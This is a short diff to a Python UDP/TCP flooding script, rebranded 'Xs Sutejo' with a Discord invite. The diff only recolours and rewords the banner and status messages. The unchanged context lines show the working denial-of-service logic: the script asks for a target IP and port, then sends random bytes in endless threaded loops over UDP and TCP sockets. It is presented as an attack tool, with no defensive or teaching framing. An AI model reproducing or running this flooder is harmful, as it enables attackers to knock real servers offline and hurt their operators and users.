@@ -12,9 +12,9 @@ import threading
 import os
 
 os.system("clear")
-print(" Remake By Xs Sutejo")
-print(" Xs.Sutejo Anti Abuse")
-print(" Join Dc Xs Team : https://discord.gg/4UNGqTy4K7 ")
+print("\033[31mRemake By Xs Sutejo")
+print("\033[31mXs.Sutejo Anti Abuse")
+print("\033[31mJoin Dc Xs Team : https://discord.gg/4UNGqTy4K7 ")
 ip = str(input(" [?]Xs.Sutejo Attacked | Ip:"))
 port = int(input(" [?]Xs.Sutejo Attacked | Port:"))
 choice = str(input(" [?]Xs.Sutejo Attacked | Senggol Gak Nih?(y/n):"))
@@ -29,13 +29,13 @@ def run():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(i +" | Gass |")
+			print(i +"[!]Xs.Sutejo is here!!")
 		except:
-			print("[?] | Disenggol Xs.Sutejo |")
+			print("[?]Disenggol Xs.Sutejo ")
 
 def run2():
 	data = random._urandom(16)
-	i = random.choice(("[]","[?]","[#]"))
+	i = random.choice(("[!]","[!]","[!]"))
 	while True:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -43,10 +43,10 @@ def run2():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +" Disenggol Xs.Sutejo")
+			print(i +"[!]Disenggol Xs.Sutejo")
 		except:
 			s.close()
-			print("[?] Xs.Sutejo Anti Abuse")
+			print("[!]Xs.Sutejo is here!!")
 
 for y in range(threads):
 	if choice == 'y':
